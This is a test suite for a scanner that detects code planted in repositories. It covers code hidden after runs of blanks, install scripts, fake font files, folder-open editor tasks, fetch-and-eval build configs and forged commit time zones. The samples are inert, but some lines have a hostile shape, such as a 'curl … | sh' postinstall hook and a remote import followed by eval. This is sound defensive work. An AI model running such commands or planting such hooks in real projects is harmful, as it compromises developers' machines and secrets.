// Samples are inert stand-ins with the same shape as the real payloads. They are only read.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { scanFile } from "../src/rules.mjs";
import { scan } from "../src/scan.mjs";

const B = (s) => Buffer.from(s, "utf8");
const rules = (p, s) => scanFile(p, typeof s === "string" ? B(s) : s).map((f) => `${f.rule}:${f.severity}`);

test("code pushed off-screen after blanks in a config", () => {
  const src = `export default { plugins: {} };${" ".repeat(400)}global['!']='x';var _$_ab12=['a'];\n`;
  const r = rules("apps/web/postcss.config.mjs", src);
  assert.ok(r.includes("hidden-after-blanks:high"));
  assert.ok(r.includes("known-marker:high"));
});

test("149 blanks (just under a round threshold) still count on a long line", () => {
  const src = `export default {};\n${" ".repeat(149)}${"x=1;".repeat(400)}\n`;
  assert.deepEqual(rules("apps/web/postcss.config.mjs", src), ["hidden-after-blanks:high"]);
  // no blanks at all, but a 5,000-character line in a build config
  assert.deepEqual(rules("tailwind.config.js", `module.exports={};${"a=1;".repeat(1250)}\n`), ["hidden-after-blanks:high"]);
  // a long line in ordinary source is not enough on its own
  assert.deepEqual(rules("src/data.ts", `export const d = [${"1,".repeat(2000)}];\n`), []);
  assert.deepEqual(rules("vendor.min.js", `!function(){}();${" ".repeat(200)}x()\n`), []);
  // blanks deep inside a bundled line (a template string), and indented text in JSON
  assert.deepEqual(rules("popup/popup.js", `${"a(b);".repeat(1000)}"<div>${" ".repeat(44)}</div>"${"c(d);".repeat(1000)}\n`), []);
  assert.deepEqual(rules("test-results/results.json", `{"message": "x${" ".repeat(50)}${"y".repeat(1100)}"}\n`), []);
});

test("what follows the blanks decides, whatever the run or line length", () => {
  // 41 blanks on a short line: under every size limit, but a payload starts right after
  assert.deepEqual(rules("postcss.config.mjs", `export default {};${" ".repeat(41)}eval(x)\n`), ["hidden-after-blanks:high", "config-exec:medium"]);
  assert.deepEqual(rules("src/a.js", `a();${" ".repeat(60)}global['x']=1\n`).includes("hidden-after-blanks:high"), true);
  // the same blanks as indentation are not hiding anything
  assert.deepEqual(rules("src/App.tsx", `${" ".repeat(44)}{(() => <div/>)()}\n${" ".repeat(48)}require('x')\n`), []);
  // aligned trailing comments are fine
  assert.deepEqual(rules("src/b.ts", `const a = 1;${" ".repeat(50)}// note\n`), []);
});

test("package.json scripts that fetch, decode or run hidden code", () => {
  const pkg = (scripts) => JSON.stringify({ name: "x", scripts }, null, 2);
  assert.deepEqual(rules("package.json", pkg({ postinstall: "curl -s https://example.invalid/a | sh" })), ["package-script:high"]);
  assert.deepEqual(rules("package.json", pkg({ preinstall: "node public/fonts/fa-solid-900.woff2" })), ["package-script:high"]);
  assert.deepEqual(rules("package.json", pkg({ dev: "node -e \"eval(atob('eA=='))\" && next dev" })), ["package-script:high"]);
  assert.deepEqual(rules("package.json", pkg({ postinstall: "node -e \"console.log(1)\"" })), ["package-script:medium"]);
  assert.deepEqual(rules("package.json", pkg({ prepare: "husky", build: "next build", test: "vitest run", postinstall: "prisma generate" })), []);
});

test("other ways to hide or load code", () => {
  assert.deepEqual(rules("icon.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), ["svg-script:medium"]);
  assert.deepEqual(rules("icon.svg", '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1"/></svg>'), []);
  assert.deepEqual(rules("vite.config.ts", "const m = await import('https://example.invalid/x.js');\neval(m.default);\n"), ["config-fetch-exec:high"]);
  assert.deepEqual(rules("next.config.js", `const s = Buffer.from('6869', 'hex').toString();\nnew Function(s)();\n`), ["config-fetch-exec:high"]);
});

test("ordinary configs and wide tables are quiet", () => {
  assert.deepEqual(rules("postcss.config.mjs", "export default { plugins: { tailwindcss: {}, autoprefixer: {} } };\n"), []);
  assert.deepEqual(rules("next.config.mjs", "import { createRequire } from 'node:module';\nconst require = createRequire(import.meta.url);\nexport default {};\n"), []);
  assert.deepEqual(rules("README.md", `| a |${" ".repeat(300)}| b |\n`), []); // not a code file
  assert.deepEqual(rules("src/app.ts", "const x = 1;\n".repeat(50)), []);
});

test("a font that is JavaScript", () => {
  assert.deepEqual(rules("public/fonts/fa-solid-900.woff2", "var a=function(){return 1};global['x']=a;\n"), ["fake-binary:high"]);
  assert.deepEqual(rules("public/fonts/fa-solid-900.woff2", Buffer.concat([B("wOF2"), Buffer.alloc(100, 1)])), []);
  assert.deepEqual(rules("assets/fonts/x.ttf", "<!DOCTYPE html><html><body>GitHub</body></html>"), ["fake-binary:info"]);
  assert.deepEqual(rules("logo.png", Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47]), Buffer.alloc(50)])), []);
  assert.deepEqual(rules("logo.png", Buffer.alloc(64, 7)), ["fake-binary:medium"]);
  assert.deepEqual(rules("flutter_01.png", Buffer.alloc(0)), []); // empty placeholder
  // renamed but real: a PNG saved as .ico, a JPEG as .png
  assert.deepEqual(rules("favicon.ico", Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47]), Buffer.alloc(50)])), []);
  assert.deepEqual(rules("icon.png", Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xee]), Buffer.alloc(50)])), []);
  // but an image is not a font
  assert.deepEqual(rules("fa-solid-900.woff2", Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47]), Buffer.alloc(50)])), ["fake-binary:medium"]);
});

test("build config that fetches and evaluates", () => {
  const src = "import 'dotenv/config';\nconst u = atob(process.env.SOME_KEY);\nfetch(u).then(r => r.text()).then(t => eval(t));\nexport function middleware() {}\n";
  assert.deepEqual(rules("middleware.ts", src), ["config-fetch-exec:high"]);
  assert.deepEqual(rules("tailwind.config.js", "const { execSync } = require('child_process');\nexecSync('echo hi');\n"), ["config-exec:medium"]);
  // any *.config.* counts, not just a list of known tools
  assert.deepEqual(rules("packages/storage/drizzle.config.ts", src), ["config-fetch-exec:high"]);
  // outside a config, eval next to the fetch is still decode-and-run
  assert.deepEqual(rules("src/lib/run.ts", src), ["decode-exec:high"]);
  assert.deepEqual(rules("src/x.js", "const f = new Function(Buffer.from(s, 'base64').toString());\n"), ["decode-exec:high"]);
  // ordinary use of the words far apart is quiet
  assert.deepEqual(rules("src/api.ts", `export const get = () => fetch('/api');\n${"// pad\n".repeat(100)}export const isFn = (x) => x instanceof Function;\n`), []);
});

test("editor tasks and settings that run on folder open", () => {
  const tasks = JSON.stringify({
    version: "2.0.0",
    tasks: [{ label: "eslint-check", type: "shell", command: "node", args: ["public/fonts/fa-solid-900.woff2"], runOptions: { runOn: "folderOpen" }, presentation: { reveal: "never", echo: false } }],
  }, null, 2);
  assert.deepEqual(rules(".vscode/tasks.json", tasks), ["vscode-autorun:high"]);
  const plain = JSON.stringify({ version: "2.0.0", tasks: [{ label: "watch", command: "pnpm dev", runOptions: { runOn: "folderOpen" } }] }, null, 2);
  assert.deepEqual(rules(".vscode/tasks.json", plain), ["vscode-autorun:medium"]);
  assert.deepEqual(rules(".vscode/settings.json", '{ "task.allowAutomaticTasks": "on" }'), ["vscode-allow-autorun:high"]);
  assert.deepEqual(rules(".vscode/settings.json", '{ "task.allowAutomaticTasks": "off" }'), []);
});

test(".gitignore dropper and write-token workflows", () => {
  assert.deepEqual(rules(".gitignore", "node_modules\nconfig.bat\n"), ["gitignore-dropper:medium"]);
  assert.deepEqual(rules(".github/workflows/ci.yml", "on: push\npermissions:\n  contents: write\n"), ["workflow-write-token:info"]);
  assert.deepEqual(rules(".github/workflows/ci.yml", "on: push\npermissions:\n  contents: read\n"), []);
});

function tempRepo() {
  const dir = mkdtempSync(path.join(tmpdir(), "planted-"));
  const g = (args, env = {}) => execFileSync("git", ["-C", dir, ...args], { stdio: "pipe", env: { ...process.env, ...env } });
  g(["init", "-q", "-b", "main"]);
  g(["config", "user.email", "dev@example.com"]);
  g(["config", "user.name", "dev"]);
  return { dir, g };
}

test("a committed env file is reported by name, and only when committed", async () => {
  const { dir, g } = tempRepo();
  writeFileSync(path.join(dir, ".env.example"), "KEY=\n");
  writeFileSync(path.join(dir, ".env.mysql.example"), "KEY=\n");
  writeFileSync(path.join(dir, ".env"), "KEY=secret\n");
  g(["add", "-A"]);
  g(["commit", "-q", "-m", "oops"]);
  const refs = await scan({ mode: "refs", dir });
  assert.deepEqual(refs.results.map((r) => `${r.rule} ${r.path}`), ["committed-env-file .env"]);
  // a local, uncommitted .env in a working tree is normal
  const wt = await scan({ mode: "worktree", dir });
  assert.equal(wt.results.length, 0);
});

test("an amended tip committed from a time zone its committer never uses", async () => {
  const { dir, g } = tempRepo();
  for (let i = 1; i <= 6; i++) {
    writeFileSync(path.join(dir, "a.txt"), String(i));
    g(["add", "-A"]);
    const d = `2026-07-0${i}T10:00:00+09:00`;
    g(["commit", "-q", "-m", `c${i}`], { GIT_AUTHOR_DATE: d, GIT_COMMITTER_DATE: d });
  }
  assert.equal((await scan({ mode: "refs", dir })).results.length, 0);
  // amended later from a zone this committer never uses: unusual, but could be travel
  g(["commit", "-q", "--amend", "--no-edit"], { GIT_COMMITTER_DATE: "2026-07-06T20:00:00-07:00" });
  const r = (await scan({ mode: "refs", dir })).results;
  assert.deepEqual(r.map((x) => `${x.rule}:${x.severity}`), ["commit-timezone:info"]);
  // forged: committer time set to the author's instant, only the zone differs
  g(["commit", "-q", "--amend", "--no-edit"], { GIT_COMMITTER_DATE: "2026-07-05T18:00:00-07:00", GIT_AUTHOR_DATE: "2026-07-06T10:00:00+09:00" });
  const f = (await scan({ mode: "refs", dir })).results;
  assert.deepEqual(f.map((x) => `${x.rule}:${x.severity}`), ["commit-timezone:medium"]);
  assert.deepEqual(f[0].where, ["main"]);
});

test("a maintainer's squash or cherry-pick from another zone is not medium", async () => {
  const { dir, g } = tempRepo();
  for (let i = 1; i <= 6; i++) {
    writeFileSync(path.join(dir, "a.txt"), String(i));
    g(["add", "-A"]);
    const d = `2026-07-0${i}T10:00:00+09:00`;
    g(["commit", "-q", "-m", `c${i}`], { GIT_AUTHOR_DATE: d, GIT_COMMITTER_DATE: d });
  }
  // authored by someone in +0530, committed hours later by this maintainer while travelling
  writeFileSync(path.join(dir, "a.txt"), "7");
  g(["add", "-A"]);
  g(["commit", "-q", "-m", "squash", "--author", "other <o@example.com>"], { GIT_AUTHOR_DATE: "2026-07-08T09:00:00+05:30", GIT_COMMITTER_DATE: "2026-07-08T20:00:00-07:00" });
  const r = (await scan({ mode: "refs", dir })).results;
  assert.ok(r.every((x) => x.severity !== "medium" && x.severity !== "high"));
});

test("--refs reads every branch tip without checking it out", async () => {
  const dir = mkdtempSync(path.join(tmpdir(), "planted-"));
  const g = (...a) => execFileSync("git", ["-C", dir, ...a], { stdio: "pipe" });
  g("init", "-q", "-b", "main");
  g("config", "user.email", "t@example.com");
  g("config", "user.name", "t");
  writeFileSync(path.join(dir, "postcss.config.mjs"), "export default {};\n");
  g("add", "-A");
  g("commit", "-q", "-m", "clean");
  g("switch", "-q", "-c", "feature/x");
  mkdirSync(path.join(dir, "public", "fonts"), { recursive: true });
  writeFileSync(path.join(dir, "public", "fonts", "fa-solid-900.woff2"), "var a=function(){};\n");
  g("add", "-A");
  g("commit", "-q", "-m", "planted");
  g("switch", "-q", "main");

  const wt = await scan({ mode: "worktree", dir });
  assert.equal(wt.results.length, 0); // main is clean on disk
  const refs = await scan({ mode: "refs", dir });
  assert.equal(refs.results.length, 1);
  assert.equal(refs.results[0].rule, "fake-binary");
  assert.deepEqual(refs.results[0].where, ["feature/x"]);
  const hist = await scan({ mode: "history", dir });
  assert.equal(hist.results.length, 1);
});
